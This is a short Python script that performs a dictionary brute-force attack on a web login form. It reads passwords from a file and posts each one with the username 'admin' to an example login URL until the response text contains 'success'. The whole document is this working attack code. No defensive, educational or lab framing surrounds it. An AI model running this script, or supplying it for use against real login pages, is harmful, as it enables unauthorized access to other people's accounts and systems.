import requests

def brute_force_login(url, username, password_list):
    with open(password_list, "r") as file:
        passwords = file.read().splitlines()
    
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "success" in response.text.lower():
            print(f"Login successful with password: {password}")
            break

# Example usage
url = "https://example.com/login"
username = "admin"
password_list = "password_list.txt"
brute_force_login(url, username, password_list)